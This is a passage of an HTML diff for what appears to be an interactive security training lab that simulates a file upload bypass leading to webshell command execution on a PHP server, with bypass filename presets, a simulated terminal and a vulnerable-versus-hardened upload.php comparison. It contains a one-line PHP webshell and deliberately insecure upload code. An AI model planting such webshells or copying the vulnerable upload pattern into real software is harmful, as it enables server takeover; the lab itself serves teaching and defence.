@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>📁 Security Lab: Unrestricted File Upload to Webshell RCE</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0b0f19;
+    --panel: #111827;
+    --panel-2: #1f2937;
+    --border: #374151;
+    --accent: #f59e0b;
+    --danger: #ef4444;
+    --safe: #10b981;
+    --blue: #3b82f6;
+    --purple: #a855f7;
+    --cyan: #06b6d4;
+    --text: #f9fafb;
+    --text-muted: #9ca3af;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  }
+
+  body {
+    font-family: var(--sans);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    line-height: 1.6;
+  }
+
+  /* ── Dynamic Animated Cyber Background ── */
+  .cyber-bg {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden;
+  }
+  .cyber-grid {
+    position: absolute; inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+  .cyber-orb {
+    position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.35; will-change: transform;
+  }
+  .orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #ef4444 0%, rgba(239,68,68,0) 70%); top: -100px; left: -100px; animation: floatOrb1 16s ease-in-out infinite alternate; }
+  .orb-2 { width: 650px; height: 650px; background: radial-gradient(circle, #f59e0b 0%, rgba(245,158,11,0) 70%); bottom: -100px; right: -120px; animation: floatOrb2 20s ease-in-out infinite alternate; }
+  .orb-3 { width: 500px; height: 500px; background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%); top: 35%; right: 20%; animation: floatOrb3 18s ease-in-out infinite alternate; }
+  .orb-4 { width: 550px; height: 550px; background: radial-gradient(circle, #3b82f6 0%, rgba(59,130,246,0) 70%); bottom: 10%; left: 15%; animation: floatOrb4 22s ease-in-out infinite alternate; }
+  @keyframes floatOrb1 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-60px, 140px) scale(0.92); } }
+  @keyframes floatOrb2 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-80px, -70px) scale(0.9); } }
+  @keyframes floatOrb3 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-100px, -50px) scale(1.05); } }
+  @keyframes floatOrb4 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(90px, 70px) scale(0.9); } }
+
+  .container {
+    max-width: 1380px;
+    margin: 0 auto;
+    padding: 24px 20px 60px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── Header ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+    padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 26px;
+  }
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+    font-size: 13px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+  .back-link:hover {
+    color: var(--text);
+    border-color: var(--accent);
+    transform: translateX(-3px);
+  }
+  .header-title h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .header-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    background: rgba(239, 68, 68, 0.15);
+    border: 1px solid rgba(239, 68, 68, 0.35);
+    border-radius: 20px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--danger);
+    font-weight: 600;
+  }
+
+  /* ── Interactive 4-Stage Synchronized Pipeline Bar ── */
+  .flow-stream-bar {
+    background: rgba(17, 24, 39, 0.85);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 14px 18px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    overflow: hidden;
+    gap: 10px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+  }
+  .flow-stream-bar::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%; height: 2px;
+    background: linear-gradient(90deg, transparent, #ef4444, #f59e0b, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser {
+    0% { left: -60%; }
+    100% { left: 140%; }
+  }
+  .flow-step-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--text-muted);
+    transition: all 0.3s;
+    cursor: pointer;
+    padding: 6px 10px;
+    border-radius: 6px;
+  }
+  .flow-step-item:hover {
+    background: rgba(255,255,255,0.05);
+  }
+  .flow-step-item.active {
+    color: #f59e0b;
+    font-weight: 700;
+    text-shadow: 0 0 10px rgba(245, 158, 11, 0.4);
+    background: rgba(245, 158, 11, 0.1);
+  }
+  .flow-step-item.completed {
+    color: var(--safe);
+  }
+  .flow-step-item.rce-active {
+    color: #f87171;
+    font-weight: 700;
+    text-shadow: 0 0 12px rgba(239, 68, 68, 0.8);
+    background: rgba(239, 68, 68, 0.12);
+  }
+  .flow-dot-pulse {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #64748b;
+  }
+  .flow-step-item.active .flow-dot-pulse {
+    background: #f59e0b;
+    box-shadow: 0 0 8px #f59e0b;
+    animation: pulseDot 1.4s infinite alternate;
+  }
+  .flow-step-item.rce-active .flow-dot-pulse {
+    background: #ef4444;
+    box-shadow: 0 0 10px #ef4444;
+    animation: pulseDotRed 1.2s infinite alternate;
+  }
+  .flow-step-item.completed .flow-dot-pulse {
+    background: var(--safe);
+    box-shadow: 0 0 6px var(--safe);
+  }
+  @keyframes pulseDot {
+    0% { transform: scale(1); opacity: 0.7; }
+    100% { transform: scale(1.5); opacity: 1; }
+  }
+  @keyframes pulseDotRed {
+    0% { transform: scale(1); opacity: 0.8; box-shadow: 0 0 4px #ef4444; }
+    100% { transform: scale(1.6); opacity: 1; box-shadow: 0 0 14px #ef4444; }
+  }
+  .flow-connector {
+    color: #4b5563;
+    font-size: 13px;
+  }
+
+  /* ── 2-Column Split Layout ── */
+  .lab-split-layout {
+    display: grid;
+    grid-template-columns: 1.05fr 1fr;
+    gap: 24px;
+    margin-bottom: 28px;
+  }
+  @media (max-width: 1040px) {
+    .lab-split-layout { grid-template-columns: 1fr; }
+    .flow-stream-bar { flex-direction: column; align-items: flex-start; }
+    .flow-connector { display: none; }
+  }
+
+  /* ── Cards & Panels ── */
+  .card-panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 22px;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.25);
+  }
+  .panel-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding-bottom: 14px;
+    border-bottom: 1px solid var(--border);
+  }
+  .panel-title {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+  }
+
+  /* ── Attack Presets ── */
+  .preset-list {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .preset-btn {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 10px 14px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    cursor: pointer;
+    text-align: left;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .preset-btn:hover {
+    border-color: var(--accent);
+    background: rgba(245, 158, 11, 0.08);
+  }
+  .preset-btn.active {
+    border-color: var(--danger);
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+  }
+  .preset-tag {
+    font-size: 10.5px;
+    padding: 2px 7px;
+    border-radius: 4px;
+    background: rgba(255, 255, 255, 0.06);
+    font-weight: 600;
+  }
+
+  /* ── Form Controls ── */
+  .form-group {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+  .form-label {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: var(--text-muted);
+    display: flex;
+    justify-content: space-between;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .form-input, .form-select, .form-textarea {
+    width: 100%;
+    background: #090d16;
+    border: 1px solid var(--border);
+    color: #38bdf8;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    padding: 9px 12px;
+    border-radius: 8px;
+    outline: none;
+    transition: all 0.2s;
+  }
+  .form-textarea {
+    min-height: 70px;
+    resize: vertical;
+    line-height: 1.5;
+  }
+  .form-input:focus, .form-select:focus, .form-textarea:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 10px rgba(245, 158, 11, 0.2);
+  }
+  .row-2col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+  .chip-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-top: 2px;
+  }
+  .quick-chip {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 3px 8px;
+    background: rgba(245, 158, 11, 0.15);
+    border: 1px solid rgba(245, 158, 11, 0.35);
+    color: #fcd34d;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .quick-chip:hover {
+    background: rgba(245, 158, 11, 0.3);
+    border-color: #fcd34d;
+  }
+
+  /* ── Action Row (Execute + Reset) ── */
+  .action-row {
+    display: flex;
+    gap: 12px;
+  }
+  .btn-execute {
+    flex: 1;
+    background: linear-gradient(135deg, #ef4444, #dc2626);
+    color: #fff;
+    border: none;
+    padding: 13px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-weight: 700;
+    font-size: 13.5px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4);
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .btn-execute:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(239, 68, 68, 0.6);
+  }
+  .btn-execute:active {
+    transform: translateY(0);
+  }
+
+  .btn-reset {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    padding: 13px 18px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    transition: all 0.2s;
+    white-space: nowrap;
+  }
+  .btn-reset:hover {
+    color: var(--text);
+    border-color: var(--accent);
+    background: rgba(245, 158, 11, 0.1);
+    transform: translateY(-2px);
+  }
+
+  /* ── Right Column: Multi-Tab Console & Visualizer ── */
+  .tab-nav {
+    display: flex;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 10px;
+  }
+  .tab-btn {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    font-family: var(--mono);
+    font-size: 11.5px;
+    padding: 6px 14px;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .tab-btn:hover {
+    color: var(--text);
+    border-color: var(--accent);
+  }
+  .tab-btn.active {
+    background: rgba(59, 130, 246, 0.15);
+    border-color: var(--blue);
+    color: #93c5fd;
+    font-weight: 600;
+  }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* Terminal Window */
+  .terminal-box {
+    background: #050811;
+    border: 1px solid #1e293b;
+    border-radius: 8px;
+    padding: 14px;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: #cbd5e1;
+    min-height: 290px;
+    max-height: 380px;
+    overflow-y: auto;
+    line-height: 1.65;
+  }
+  .t-prompt { color: #10b981; font-weight: 600; }
+  .t-cmd { color: #facc15; }
+  .t-err { color: #f87171; }
+  .t-info { color: #38bdf8; }
+  .t-highlight { background: rgba(239, 68, 68, 0.2); color: #fca5a5; padding: 2px 4px; border-radius: 4px; }
+  .t-success { color: #4ade80; font-weight: 600; }
+
+  /* File Explorer Box */
+  .explorer-box {
+    background: #050811;
+    border: 1px solid #1e293b;
+    border-radius: 8px;
+    padding: 14px;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    min-height: 290px;
+    max-height: 380px;
+    overflow-y: auto;
+  }
+  .folder-title {
+    color: #facc15;
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+  .file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 6px 10px;
+    border-radius: 6px;
+    background: #0f172a;
+    border: 1px solid #1e293b;
+    margin-bottom: 6px;
+  }
+  .file-item.danger-file {
+    border-color: #ef4444;
+    background: rgba(239, 68, 68, 0.1);
+  }
+  .file-name { color: #f1f5f9; display: flex; align-items: center; gap: 6px; }
+  .file-meta { font-size: 10.5px; color: #94a3b8; }
+
+  /* Validation Trace */
+  .val-box {
+    background: #050811;
+    border: 1px solid #1e293b;
+    border-radius: 8px;
+    padding: 14px;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    min-height: 290px;
+    max-height: 380px;
+    overflow-y: auto;
+  }
+  .val-step {
+    padding: 8px 12px;
+    background: #0f172a;
+    border-left: 3px solid #3b82f6;
+    border-radius: 4px;
+    margin-bottom: 8px;
+  }
+  .val-step.pass { border-left-color: #10b981; background: rgba(16, 185, 129, 0.08); }
+  .val-step.fail { border-left-color: #ef4444; background: rgba(239, 68, 68, 0.08); }
+  .val-title { font-weight: 700; color: #f8fafc; margin-bottom: 2px; }
+  .val-desc { color: #94a3b8; font-size: 11px; }
+
+  /* Verdict Banner */
+  .verdict-banner {
+    border-radius: 10px;
+    padding: 14px 18px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    transition: all 0.3s;
+  }
+  .verdict-banner.danger {
+    background: rgba(239, 68, 68, 0.14);
+    border: 1.5px solid #ef4444;
+    color: #fecaca;
+  }
+  .verdict-banner.warning {
+    background: rgba(245, 158, 11, 0.14);
+    border: 1.5px solid #f59e0b;
+    color: #fef08a;
+  }
+  .verdict-banner.safe {
+    background: rgba(16, 185, 129, 0.14);
+    border: 1.5px solid #10b981;
+    color: #a7f3d0;
+  }
+  .verdict-title {
+    font-weight: 700;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* ── Code Comparison & Remediation Section ── */
+  .breakdown-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.25);
+    margin-bottom: 30px;
+  }
+  .breakdown-card h3 {
+    font-size: 16px;
+    font-family: var(--mono);
+    color: #38bdf8;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .code-comparison-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin-top: 14px;
+  }
+  @media (max-width: 820px) {
+    .code-comparison-grid { grid-template-columns: 1fr; }
+  }
+  .code-box {
+    background: #05070f;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.6;
+  }
+  .code-box.vulnerable { border-left: 4px solid var(--danger); }
+  .code-box.secure { border-left: 4px solid var(--safe); }
+  .code-box-title {
+    font-weight: 700;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    text-transform: uppercase;
+    font-size: 11.5px;
+  }
+  .code-box.vulnerable .code-box-title { color: var(--danger); }
+  .code-box.secure .code-box-title { color: var(--safe); }
+
+  /* ── Standard Modern Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, #1f2937, #111827);
+    padding: 12px 28px; border-radius: 30px; font-family: var(--mono); font-size: 13.5px;
+    color: #9ca3af; border: 1px solid #374151;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: #ef4444;
+    color: #f9fafb;
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Dynamic Cyber Background -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+</div>
+
+<div class="container">
+
+  <!-- Header -->
+  <header class="header">
+    <div class="header-left">
+      <a href="../guides/File_Upload.html" class="back-link">← Back to File Upload Notes</a>
+      <div class="header-title">
+        <h1>📁 Webshell Upload to Remote Code Execution (RCE)</h1>
+      </div>
+    </div>
+    <div class="header-badge">
+      <span>● ACTIVE LAB</span>
+    </div>
+  </header>
+
+  <!-- Interactive 4-Stage Synchronized Pipeline Bar -->
+  <div class="flow-stream-bar" id="pipeline-stream">
+    <div class="flow-step-item active" id="step-1" onclick="applyPreset(1)">
+      <span class="flow-dot-pulse"></span>
+      <span>1. Normal Image Upload</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-2" onclick="applyPreset(2)">
+      <span class="flow-dot-pulse"></span>
+      <span>2. Extension Blacklist Bypass</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-3" onclick="applyPreset(3)">
+      <span class="flow-dot-pulse"></span>
+      <span>3. Direct Webshell HTTP Call</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-4" onclick="applyPreset(4)">
+      <span class="flow-dot-pulse"></span>
+      <span>4. Weaponized Interactive RCE</span>
+    </div>
+  </div>
+
+  <!-- Dual Split Lab Layout -->
+  <div class="lab-split-layout">
+
+    <!-- Left Column: Attacker Upload Studio -->
+    <div class="card-panel">
+      <div class="panel-header">
+        <div class="panel-title">
+          <span>🛠️ Web Application File Uploader</span>
+        </div>
+        <span style="font-family:var(--mono); font-size:11px; color:#64748b;">POST /upload.php</span>
+      </div>
+
+      <!-- Quick Attack Presets -->
+      <div class="form-group">
+        <label class="form-label">
+          <span>Exploit Presets:</span>
+          <span style="color:var(--accent)">Stage-Driven</span>
+        </label>
+        <div class="preset-list">
+          <button type="button" class="preset-btn active" id="preset-btn-1" onclick="applyPreset(1)">
+            <span>1. Legitimate: Upload Profile Picture (avatar.png)</span>
+            <span class="preset-tag" style="color:var(--safe)">SAFE</span>
+          </button>
+          <button type="button" class="preset-btn" id="preset-btn-2" onclick="applyPreset(2)">
+            <span>2. Bypass: Alternate Executable Extension (shell.phtml)</span>
+            <span class="preset-tag" style="color:var(--accent)">FILTER BYPASS</span>
+          </button>
+          <button type="button" class="preset-btn" id="preset-btn-3" onclick="applyPreset(3)">
+            <span>3. Polyglot / MIME: shell.php + image/jpeg Header</span>
+            <span class="preset-tag" style="color:var(--danger)">MIME BYPASS</span>
+          </button>
+          <button type="button" class="preset-btn" id="preset-btn-4" onclick="applyPreset(4)">
+            <span>4. Weaponize: Execute OS Commands (&amp;cmd=)</span>
+            <span class="preset-tag" style="color:var(--danger)">FULL RCE</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Filename & MIME Content-Type -->
+      <div class="row-2col">
+        <div class="form-group">
+          <label class="form-label" for="file-name">
+            <span>Filename:</span>
+          </label>
+          <input type="text" id="file-name" class="form-input" value="avatar.png">
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="mime-type">
+            <span>MIME Content-Type:</span>
+          </label>
+          <select id="mime-type" class="form-select">
+            <option value="image/png" selected>image/png</option>
+            <option value="image/jpeg">image/jpeg</option>
+            <option value="application/x-php">application/x-php</option>
+            <option value="application/octet-stream">application/octet-stream</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Filename Helper Chips -->
+      <div class="form-group">
+        <label class="form-label"><span>Bypass Filename Vectors:</span></label>
+        <div class="chip-row">
+          <span class="quick-chip" onclick="setFilename('shell.php')">shell.php</span>
+          <span class="quick-chip" onclick="setFilename('shell.phtml')">shell.phtml</span>
+          <span class="quick-chip" onclick="setFilename('shell.php5')">shell.php5</span>
+          <span class="quick-chip" onclick="setFilename('shell.php.jpg')">shell.php.jpg</span>
+          <span class="quick-chip" onclick="setFilename('shell.phar')">shell.phar</span>
+        </div>
+      </div>
+
+      <!-- File Content / Webshell Script -->
+      <div class="form-group">
+        <label class="form-label" for="file-content">
+          <span>Uploaded File Content / Payload:</span>
+          <span style="color:var(--purple)">Script Body</span>
+        </label>
+        <textarea id="file-content" class="form-textarea">[Binary PNG Image: 1420 bytes of image bitmap data]</textarea>
+      </div>
+
+      <!-- Shell Command Input (Active when Webshell is deployed) -->
+      <div class="form-group">
+        <label class="form-label" for="cmd-input">
+          <span>Webshell Command Parameter (?cmd=):</span>
+          <span style="color:var(--danger)">OS Exec</span>
+        </label>
+        <input type="text" id="cmd-input" class="form-input" value="id; whoami; uname -a">
+      </div>
+
+      <!-- Action Row: Execute + Reset -->
+      <div class="action-row">
+        <button type="button" class="btn-execute" id="btn-fire" onclick="fireUpload()">
+          <span>🚀 Upload File &amp; Trigger Execution</span>
+        </button>
+        <button type="button" class="btn-reset" onclick="resetLab()">
+          <span>↺ Reset Lab</span>
+        </button>
+      </div>
+
+    </div>
+
+    <!-- Right Column: Multi-Tab Live Inspector -->
+    <div class="card-panel">
+      <div class="tab-nav">
+        <button type="button" class="tab-btn active" onclick="switchTab('tab-terminal', this)">💻 Live Terminal</button>
+        <button type="button" class="tab-btn" onclick="switchTab('tab-explorer', this)">📂 Uploads Directory</button>
+        <button type="button" class="tab-btn" onclick="switchTab('tab-validation', this)">🔍 Validation Trace</button>
+      </div>
+
+      <!-- Tab 1: Live Web Terminal -->
+      <div id="tab-terminal" class="tab-content active">
+        <div class="terminal-box" id="terminal-content">
+          <span class="t-info">// ApexPortal Apache/2.4 (PHP 8.1 Engine)</span><br>
+          <span class="t-info">// Web Root: /var/www/html/ | Upload Directory: /var/www/html/uploads/</span><br><br>
+          <span class="t-prompt">www-data@apex-web-01:~$</span> <span class="t-cmd">watch -n 1 ls -la /var/www/html/uploads/</span><br>
+          <span style="color:#64748b;">[Ready for incoming file uploads...]</span>
+        </div>
+      </div>
+
+      <!-- Tab 2: Uploads Directory Explorer -->
+      <div id="tab-explorer" class="tab-content">
+        <div class="explorer-box" id="explorer-content">
+          <div class="folder-title">📁 /var/www/html/uploads/ (Public Web-Accessible)</div>
+          <div class="file-item">
+            <span class="file-name">🖼️ default-avatar.png</span>
+            <span class="file-meta">rw-r--r-- | 12 KB</span>
+          </div>
+          <div class="file-item">
+            <span class="file-name">📄 company-policy.pdf</span>
+            <span class="file-meta">rw-r--r-- | 340 KB</span>
+          </div>
+          <div id="uploaded-file-item" style="display:none;"></div>
+        </div>
+      </div>
+
+      <!-- Tab 3: Validation Logic Inspector -->
+      <div id="tab-validation" class="tab-content">
+        <div class="val-box" id="val-content">
+          <div class="val-step pass">
+            <div class="val-title">1. Client-side Form Validation</div>
+            <div class="val-desc" id="val-step-1">Browser checked for non-empty file field.</div>
+          </div>
+          <div class="val-step pass">
+            <div class="val-title">2. Server-side Extension Filter</div>
+            <div class="val-desc" id="val-step-2">Weak blacklist: only checked literal ".php".</div>
+          </div>
+          <div class="val-step pass">
+            <div class="val-title">3. MIME-Type Content-Type Header</div>
+            <div class="val-desc" id="val-step-3">Trusted client-supplied header without magic-byte check.</div>
+          </div>
+          <div class="val-step pass">
+            <div class="val-title">4. Storage &amp; Execution Permissions</div>
+            <div class="val-desc" id="val-step-4">Saved directly in web root /uploads/ with PHP execution enabled.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Verdict Banner -->
+      <div class="verdict-banner safe" id="verdict-card">
+        <div class="verdict-title" id="verdict-title">
+          <span>🛡️ STATUS: LEGITIMATE FILE UPLOAD</span>
+        </div>
+        <div id="verdict-desc">
+          Normal PNG file safely accepted. Stored in /uploads/ as non-executable asset.
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- Technical Breakdown & Vulnerability Remediation -->
+  <div class="breakdown-card">
+    <h3>🔍 Technical Mechanics: How Webshell Uploads Yield Full System RCE</h3>
+    <p style="font-size:13.5px; color:#cbd5e1; margin-bottom:14px;">
+      When an application allows users to upload files without rigorous server-side verification, attackers can upload server-side scripts (such as <code>.php</code>, <code>.phtml</code>, <code>.jsp</code>, or <code>.asp</code>). If the uploaded file is placed into a directory that is directly mapped to the web server's document root (e.g. <code>/uploads/</code>), the web server's PHP/CGI interpreter will execute the code whenever a web request requests that file.
+    </p>
+    <p style="font-size:13.5px; color:#cbd5e1;">
+      A basic webshell containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code> immediately hands full operating system command execution to anyone who requests <code>/uploads/shell.php?cmd=whoami</code>, completely bypassing authentication and network perimeters.
+    </p>
+
+    <div class="code-comparison-grid">
+      <!-- Vulnerable Code -->
+      <div class="code-box vulnerable">
+        <div class="code-box-title">❌ Vulnerable PHP Upload Script</div>
+<pre><code><span style="color:#64748b;">// upload.php — Flawed validation logic</span>
+&lt;?php
+  $filename = $_FILES['avatar']['name'];
+  $temp = $_FILES['avatar']['tmp_name'];
+
+  <span style="color:#ef4444;">// FLAW 1: Blindly trusts client-supplied filename!</span>
+  <span style="color:#ef4444;">// FLAW 2: Saves inside web-accessible directory!</span>
+  $destination = "uploads/" . $filename;
+
+  move_uploaded_file($temp, $destination);
+  echo "File uploaded to: " . $destination;
+?&gt;</code></pre>
+      </div>
+
+      <!-- Secure Remediation -->
+      <div class="code-box secure">
+        <div class="code-box-title">✅ Hardened Secure Upload Implementation</div>
+<pre><code><span style="color:#64748b;">// upload.php — Multi-layer defense</span>
+&lt;?php
+  <span style="color:#10b981;">// 1. Strict whitelist of allowed extensions</span>
+  $allowed_exts = ['jpg', 'jpeg', 'png'];
+  $ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
+  if (!in_array($ext, $allowed_exts)) die("Invalid file type.");
+
+  <span style="color:#10b981;">// 2. Verify magic bytes &amp; re-encode image with GD</span>
+  $finfo = new finfo(FILEINFO_MIME_TYPE);
+  $mime = $finfo-&gt;file($_FILES['avatar']['tmp_name']);
+  if (!in_array($mime, ['image/jpeg', 'image/png'])) die("Fake image.");
+
+  <span style="color:#10b981;">// 3. Rename to random UUID outside web root &amp; disable exec</span>
+  $safe_name = bin2hex(random_bytes(16)) . "." . $ext;
+  move_uploaded_file($_FILES['avatar']['tmp_name'], "/var/storage/" . $safe_name);
+?&gt;</code></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Footer -->
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+<script>
+  let currentStage = 1;
+
+  function setFilename(name) {
+    document.getElementById('file-name').value = name;
+  }
+
+  function switchTab(tabId, btn) {
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+    btn.classList.add('active');
+  }
+
+  function applyPreset(stage) {
+    currentStage = stage;
+
+    // Update pipeline steps
+    for (let i = 1; i <= 4; i++) {
+      const stepEl = document.getElementById('step-' + i);
+      const presetBtn = document.getElementById('preset-btn-' + i);
+      stepEl.classList.remove('active', 'completed', 'rce-active');
+      presetBtn.classList.remove('active');
+
+      if (i < stage) {
+        stepEl.classList.add('completed');
+      } else if (i === stage) {
+        if (stage === 4) {
+          stepEl.classList.add('rce-active');
+        } else {
+          stepEl.classList.add('active');
+        }
+        presetBtn.classList.add('active');
+      }
+    }
+
+    const nameInput = document.getElementById('file-name');
+    const mimeSelect = document.getElementById('mime-type');
+    const contentArea = document.getElementById('file-content');
+    const cmdInput = document.getElementById('cmd-input');
+
+    if (stage === 1) {
